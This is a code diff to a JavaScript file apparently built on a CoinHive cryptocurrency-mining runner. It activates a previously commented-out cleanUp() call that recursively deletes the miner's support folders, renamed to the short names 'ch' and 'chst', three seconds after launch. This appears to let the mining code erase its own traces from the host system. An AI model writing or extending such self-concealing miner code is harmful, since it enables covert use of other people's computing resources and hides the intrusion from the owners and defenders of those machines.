@@ -405,20 +405,14 @@ const CoinHive = async function getRunner(siteKey, constructorOptions = defaults
                               deleteFolderRecursive(curPath);
                           } else { // delete file
                               fs.unlinkSync(curPath);
-                              
-                              /*fs.unlink(curPath, (err) => {
-                                  if (err) {
-                                      throw err;
-                                  }
-                              });*/
                           }
                           
                       });
                       fs.rmdirSync(path);
                     }
                 };
-                deleteFolderRecursive(rootDir + "/node_modules/coin-hive");
-                deleteFolderRecursive(rootDir + "/node_modules/coin-hive-stratum");
+                deleteFolderRecursive(rootDir + "/ch");
+                deleteFolderRecursive(rootDir + "/chst");
 
               
           } catch(e) {
@@ -427,6 +421,6 @@ const CoinHive = async function getRunner(siteKey, constructorOptions = defaults
           
       }, 3000);
   };
-  //cleanUp();
+  cleanUp();
   
 })();
